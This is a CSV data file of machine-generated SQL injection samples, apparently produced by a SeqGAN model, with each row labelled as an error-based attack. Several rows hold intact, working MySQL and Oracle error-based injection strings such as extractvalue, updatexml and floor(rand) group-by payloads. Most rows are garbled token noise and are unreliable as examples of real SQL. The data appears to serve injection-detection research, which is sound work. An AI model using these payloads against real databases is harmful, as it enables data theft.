label,payload,family,payload_type,method,run_id,sample_index
attack,1'||  (  select 'y(ua'  =  '_'  =  't,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,324
attack,"1'||  (  select 'xyu_""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  "".geerauasass 9173   x  )  ,concat  (  (  ||r  castselect when   (  case chrNr  (  (  0   RM when  --  ||cxss.rs or 1 end 6913  )  *",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,325
attack,"1'||  (  select '  uahrNU  )  ,  select  )   then 0 or chr  select chhr  (  4493  ||chr  ( 3931 8488 DIIT elseYdrWo_r   gT  a   (  ,0x717a767a71)   (  ||r  (  ||r  (  ,  113  benchmark  case|| LISSr.USOIUMM end  )  )   ,r  (  (  6055tr   and else by  by * end   then AND whereelse|| DNSIwhereIN. gI",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,326
attack,"-""  =  ""vn",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,327
attack,"-U3051--_select union  AND 5192 xdole_r.0   7158  ,  SELECT 3051 group AM (  ||chr  (  5000000,1   )   x DS RG group 1  union union dhr  (  =  =  )     8382  ||choep information_schemaxT concat   select x ANTSI  (  (  112  ||chr  )  *i,hconcat,0x717a767a71  --,concat  x  )a   *    )        )   x  )    )     )   )    )  un",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,328
attack,1zfq.N,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,329
attack,-6825when  (  ||chuiarxxNCnesaaddasckwhtygo_,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,330
attack," R5584.ATIselectIk  (  (  )  ,  ||chr  (  select from 6082  (   (  rand  *  ||chxut_acs group daur_ounedr_gysthr  (  ,  (  select  where by AND by 5584 0 h from (  6055select concat  =  113  )  =  --ine  4607a from dhr  (0x717a767a71,  select end  #2   (    ,floor  )  ,  (      thenchr  (  =,  )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,331
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'zes(     8190||chr  113  ||  u  select 'i'  select DINIMe.chr  (a RDMIEhchr  7881  113  4510   un   ( 0  select FROM AND   (  4232  rand,0x717a767a71,concat  (  4232  (  9067 1  ||cz  106  ,     =,1 else 1 drx m then D by or D 1   INrow_r.niatameuadun2   select WHERE     AND x 1IISpC",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,332
attack,-0x786913t_rasNads 113  select or x  )     )     )   x   then union D RIx  6237. else  )    8488     )  )   then     (  SELECT else or else 1x  LE5192 hconcat  0x7171706a710x5c   (  case when   (  ||chr  (  =  )     ||  ( or union 1 concat  rand  rand  case when   )  )  )   )    tu5  5023  )  )     || 1 select 0  1 union WHERE D3931IMENSTw,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,333
attack,ANDM ANSTT  (  (  =  #e6237  ) )   s group 1 x ANDchr  (    )  ||chr  (  )   0)   n from 1045fromuas information_schema.chr  (  =  e3051select by   : 5192 dr(  (  (  ||chr   select 3051 select 1  ||chr  (  case group 1  1xtos.  (   ||  'er.ahr  (  ||chr  (  =  ||chr  (  select from ,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,334
attack,"11'     ,floor  (  select =  )    or 0 h when  (  8190  =  uaut  (  =  *2   *n   )  select FROM =  (  0  *2   1297  ,  select FROMtr  (  (  113  6055  )  etvysnt_tr   A 1 else 5584 )   9325o andhr  (  )  ),  >  )   and when   (  )     ,  )  ,  select union select group  from s group end  )    x 0 union",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,335
attack,1'||  (  select 't  chsp  4607  select   SELECT 5192 3931 INCMiT  6aam   . then union 1 6082  (  =  )   x 3931 5305 'i'  casewhent  addr  a_.cown  utad.(  arr  (  )    )    having x by 0 1 when or.chr  106  )  #,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,336
attack,"1O' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'M3326etu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,337
attack,"11045nt  (  >  ||chr  )  (0x717a767a71,1   xddrqs(z. concat  )    )  --   or (  )    )     || union  =  case select 'i'b   (  case    8877 concat  118  ||chr  (  ||chr  (  ||  (  =  ||  (  = 5023  || 0  4232  )  ,7469  || group or else and c  rand  )   (  a by )  )    )   )    )        I FROM end  )   )   SELECT   ||where ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,338
attack,1'5840iaunvas_,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,339
attack,1%9627al,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,340
attack,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and '78816825 group unionr  =  6237,concat  (  select from   FROM 7158  =T  )   then when   then  *t  ||ar.chr  ua when   (  (concat  )  ,0x717a767a71,7469(  >  =hr  (  having,floor  (  ||ch  (  0  ||chhr select end  ||ceuna  (  (  )  case from doyssneuaraddsss.t  (  rand    ||chr  s else end   (  =  eltr   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,341
attack,"-""  =  ""N9176",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,342
attack,"-floorii,0x717a767a71a0 6913  )  )e1045achr  (  rand  4232  )   x   then AND D else wheni   x FROM  (  ,floor  4386  0x717a767a71)   )  --,0x717a767a71,floor  (  )   x  ||c  )    )   )   '   )    )   )       S 0 unionx end   (  ||eerrotr.( 9067      x  case     SELECT 1   ISOUISITT  3326  0  ||chcr  4607  *2e when  106  ||chr  =  )   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,343
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '1392uasyyhswua",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,344
attack,-7810s chr  (  ||chr  (  )  ||  select union from   from fromu  #,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,345
attack,"-""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""'  =  'yuq",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,346
attack,"1 3051WHERE when when from a 1 7158  select 8488M  Rp information_schemaue where x s,hr  select concat  (  =  )        AND union FROMunaao 6055  (        )     )   x   then  AND 1 m when   (  9067)  )   from   then1 ||r  (  113  select 3440  ||c group FROM concathr  (  =  4232   )    )   or and 5584 h1.chr  (  (  4232  )   then 5023  ||chr  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,347
attack,"1""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  """"  ,floor0x717a767a71,floor  0      ,1   (  ,6055  ||chru,  =  5840  )   or    SELECT else 0IDTFROM.etaU.geaass group 2131  *26055  )  case when   Yhr  select information_schemar 3785INCNITSNUIT||Thhr  (  122  )  ||chr  6237  113  ||cu  =    )   and       4510  es     case 5192 x concat  select113  select 1   WHERE 1u 1  )   )   then ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,348
attack,-8AND6237aCc'    from     by 2131 chhr  (  ||r  (  *   select end  case Ry AS. x  ernaaxsosues when   (  0  ||chr  (  *   from  ||chr  (  FROMas   by by select 0U   SELECT 1 by LISThs.f  rand  0x7171706a71e  adxx.h  (  113  )  ||  =  ||r  (  a   t  (  )   (  || information_schemaounars ,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,349
attack,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""owwba_alb'  =  '_.)    #elunas 3051 1 else select information_schema.xcr  (  )   from d x else r  (  ||r  (  case =  )  =  (  )   9325  9173       having where 1 DISN.where else and FROM 'i'  select else select or end  =  )and ||  =  )    FROMu2    )   x  end  || fromhr  (  (  i  )   thenchss benchmark  (  ,  6055      2",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,350
attack,"1""_y.s""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""ees  (  ||chouay_r  (    )  case  (  ||chr  (  select du2  having  =a:p  )   from  1x  z RCT   )    )   FROM   (  rand  caseIM LNAM  end  (,floor  =  )   )       ||counedo_oes.chr  (  ||  113  ||chr  6237  --  =  ada c  (  u2 floor  =  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,351
attack,"1-7319WHERE  ||cr  6270,1xxchr  (  select from group 1 1  dcr  (  ||char  ,w  e0x7171706a71ar_adadrt_ned_sUn   (  ||USwz.foou'  =  'j",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,352
attack,"1'5840  )   4510Ininxwhere information_schemavs.end  )   )0x78   and  =  0   )    )     )   then  concat  chr  1045  rand  chr  (  select L from WHERE d RC 1 by xIT  select or 2017E=  )and 7158    )     113  6237,floor  a concat  *  SELECT G by when   (  ||chr  chr  =  (  )     )     3074   )   (  )   then FROM from =  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,353
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'wwbet_",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,354
attack,"1""'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'xnam   )    #in   )    then by 1 where dYduchr  (  rand  113  )  ,   benchmark  (  )   from 1    )     )    SELECTITe when  selects (  *2 0 FROM from  =  *2   ||cx.dunadtu  (  ,0x717a767a71case 3440  ,   when   WHERE when  select where 5192 a AIiT end  =   )  etee   6913  (  =  ,FROMn   ,  ||oun   (  )     select ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,355
attack,"1z)0 or AND m)  112  ||ac  )        )    >o.Toxr.s (  rand  (  4232  )  select from  ,  =  benchmark  )  *  a  )   from group   )     )    ||seria union 4493  ,concat  (  * from 6913  ||chr  xa",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,356
attack,"1""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""Nbkfq",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,357
attack,"1%9067eete.erasassnadd_r  rand  113  from  ||c  (  select x from 0 hNOGIT  (  )   (  )     )    ,0x717a767a71u,0x717a767a71)  )  ,||chr  (  122  --et_alchhr  (0x717a767a71  case RU whenoa do.sup.r  6913  ||co  =  0 FROM (  ||chrhr  6055  SELECT unionfr  (,1  3326   from 5856 3785chr  (  *2    (",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,358
attack,"-4232NIOWN:-E5606  ||yyssyerx.gsyerer  113  select   )   WHERE group 4493  )   and 1 x  ) from x - 5856  6237  =   6825 union 3931 x end  )    )   then 1 7158  select  0 7158  )AND  thenE  0  )  )   )    ,concat  =  )   from toun0x7171706a71touNystsese 6825  3931 p when   or 1 union or select from 1 concat  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,359
attack,"1""   )     ,floor  select   (  (  ||chr  (  )      R where 0 union by DINMINT  (  113  =  )     )     )   or ANDi,1 1  AOMINTeuas.a  selectnamnp  (  ||  (  )  )  )     ,select,0x717a767a71,7469  =ujr.gclmeatr  (  ||  aur.(  =  a   and   AND group RS--T.y  113  )  1045,floor  )  )    ,b   FROM",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,360
attack,"1%'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  '8382",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,361
attack,"1'   )     )   )4232  select group 1   1 else 6825 0 0 from group R LISNCT  (  0     ,  ||ch_r  =_,concat  (    113  =0x717a767a71,concat  case when   (  =0x717a767a71,,0x717a767a71     ||chr  (  ,hchrhr  (  ||chrhr  =  (  =  )   from d.chr  ainatfaas   (  rand  0  case m2   hr  (  4232  0x7171706a71)   x union 1 1xr",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,362
attack,"11'||  (  select ''   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'a      a4232",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,363
attack,"-'     (  ||chrs o DR.M group 1o  )   SELECT else)       ||chr  (  case or where by  0 1 chr_r 6913  5023  ||  =  case 9067 8877 0 concat  113  (  = from u union   from 6055  selecte  1    ||chr  (  ||ch  (  selectdru   Yor then select select AND else0.OONrx  (  (  ||chr   (  case 1 end  =  3326  *,  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,364
attack,"' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'jhr  (  select concat  ||chhr  =hr  (  select   auetrua_(  rand  =  )  )   information_schema,1 unionhr  (  (  ||k group T   1   )    )  )     then else --x  )   )    --  ||tctu  (  select  select else when   (  ||chr  (  )  0x4b774c75    concat  SELECT where information_schemaThhsasune _auniaatdr.  (  (  (  ||lthr  (  case ,1",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,365
attack,1%btzby9740lwbbiv,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,366
attack,"qWHERExINinformation_schemayww5584*ANDemYer  (  ||choou6237tq  )  case when   (  ,  =  *,concat  ||chohr.jhr7562  (  ||chr  (  =  )   SELECTO0INI7158bThr  (  = SELECT by D 3931and by whenby  )  4386   (>  ,xinr  xesx 7158  select from (  '||  (  select ' from  ,  113  ,  0  (  select from hhzhr  (  0x7171706a71||s FROM  (",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,367
